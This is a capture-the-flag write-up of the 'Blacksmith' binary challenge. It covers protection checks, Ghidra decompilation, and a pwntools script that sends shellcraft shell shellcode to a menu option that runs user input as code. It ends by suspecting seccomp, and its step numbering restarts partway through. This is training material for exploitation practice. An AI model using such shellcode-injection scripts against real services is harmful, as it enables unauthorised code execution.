# Blacksmith
> Write-up author: jon-brandy
## DESCRIPTION:
You are the only one who is capable of saving this town and bringing peace upon this land! 
You found a blacksmith who can create the most powerful weapon in the world! You can find him under the label "./flag.txt".
## HINT:
- NONE
## STEPS:
1. First, unzip the `.zip` file given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209630413-478b7d78-09af-4f9c-adb6-5639252b1a44.png)


2. Check the file type.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209630465-9cf4b060-c9ec-44bd-9436-09c5ee7bf3fd.png)


3. Since it's a binary file, now check the the binary's protection.

> RESULT - NX DISABLED (Means we can inject shellcode and is allowed to execute it)

![image](https://user-images.githubusercontent.com/70703371/209630701-82e94e29-1116-4e00-b851-0ab925d72e7b.png)


4. Let's decompile the binary using ghidra.

> RESULT - MAIN FUNCTION

![image](https://user-images.githubusercontent.com/70703371/209918543-54eae053-c967-46a9-b0fc-94e07cb27295.png)


5. Based from the `main()` function, we know that the program will prompts us an input.
6. If we input 1, then the program will print `&DAT_001012e0`, which allows us to choose another input.

![image](https://user-images.githubusercontent.com/70703371/209918798-9988c6f5-1c2a-4d90-9510-a948e7a4a395.png)


7. If we choose 2, the program will call the `shield()` function, 3 for the `bow()` function and 1 for the `sword()` function.

![image](https://user-images.githubusercontent.com/70703371/209918965-f1009b6a-0b41-4683-b1c6-a1015d91228a.png)


8. Let's deep dive to those 3 functions.

> SHIELD()

![image](https://user-images.githubusercontent.com/70703371/209919253-3f59e1e5-8dfd-4e5d-a975-84fa1cfa2a1f.png)


9. At the `shield()` we know that there's no bufferoverflow vuln, but we are given direct code execution.

![image](https://user-images.githubusercontent.com/70703371/209919389-24aa76b8-184b-4706-9d69-e36fef5d3a8a.png)


> BOW()

![image](https://user-images.githubusercontent.com/70703371/209919443-e50884ed-948b-4873-8fcb-7bcd6f38040f.png)


10. Nothing interesting here, let's check the `sword()` function.

> SWORD()

![image](https://user-images.githubusercontent.com/70703371/209919499-b22ae996-ccca-43b4-b32e-15541bd3e7d1.png)


11. Still the same, hence let's go back to the `shield()` function.
12. Now let's run `chmod` to the binary then run the it in gdb.

> RESULT - PRESS 1

![image](https://user-images.githubusercontent.com/70703371/209919782-bf81c2f4-74b0-487e-834e-398d96fd70c1.png)


13. Choose for the shield.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209919853-ef3c5cf4-19a9-4746-8c32-340ca4894418.png)


4. Input any strings.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209919925-188f792b-84e6-4e4b-a9fb-04ffe927c1aa.png)


5. Got segmentation fault here, it happens not because we overflowed the buffer, because what we enter will be executed as code which is not valid.
6. Hence our here is our temporary script.

> TEMPS SCRIPT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './blacksmith'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()

# we are using shellcraft, because it's just executing code.
shellcode = asm(shellcraft.sh())

sh.sendlineafter('>', b'1')
sh.sendlineafter('>', b'2')
sh.sendlineafter('>', flat(shellcode))

sh.interactive()

```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/209923261-c7d55058-e321-45d1-ac03-acd3abc8b938.png)


7. Let's use `shellcraft.cat` since the desc said that the flag is under /flag.txt`. Change the **sh.interactive()** to this:

```py
getFlag = sh.recv()
success(getFlag)
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209923541-98fceec9-b681-45a8-94ac-e745172449b2.png)


8. Based from the output we got, i think there's `seccomp`.

> SECCOMP

```
Secure computing mode ( seccomp ) is a Linux kernel feature. You can use it to restrict the actions available within the container. The seccomp() system call operates on the seccomp state of the calling process. You can use this feature to restrict your application's access.
```



## LEARNING REFERENCES:

```
https://docs.docker.com/engine/security/seccomp/
```
